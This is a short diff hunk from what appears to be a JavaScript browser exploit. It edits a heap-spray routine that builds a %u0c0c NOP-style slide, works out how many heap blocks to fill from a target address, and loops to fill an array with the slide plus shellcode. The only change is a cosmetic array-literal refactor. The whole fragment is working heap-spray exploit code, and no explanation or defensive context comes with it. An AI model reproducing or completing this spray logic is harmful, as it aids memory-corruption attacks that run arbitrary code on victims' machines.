@@ -14,7 +14,7 @@ var spraySlideSize = hbshelloworld - (payLoadSize+0x38);
 var spraySlide = unescape("%u0c0c%u0c0c");
 spraySlide = getSpraySlide(spraySlide,spraySlideSize);
 heapBlocks = (helloworld2Address - 0x100000)/hbshelloworld;
-memory = new Array();
+memory = [];
 for (i=0;i<heapBlocks;i++)
 {
 memory[i] = spraySlide + shellcode;
